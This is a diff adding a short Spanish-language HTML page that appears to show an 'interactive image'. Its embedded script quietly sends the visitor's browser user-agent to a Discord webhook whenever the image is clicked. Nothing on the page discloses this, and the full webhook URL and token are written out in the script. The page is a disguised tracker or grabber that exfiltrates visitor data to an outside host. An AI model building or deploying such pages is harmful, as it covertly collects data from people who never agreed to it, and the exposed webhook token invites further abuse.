@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Imagen Interactiva</title>
+</head>
+<body>
+    <img src="kartamort.png" id="interactiva" alt="Imagen Interactiva" style="width:300px;height:auto;">
+
+    <script>
+        document.getElementById('interactiva').addEventListener('click', function() {
+            const userAgent = navigator.userAgent;
+            fetch('https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ userAgent: userAgent }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Éxito:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
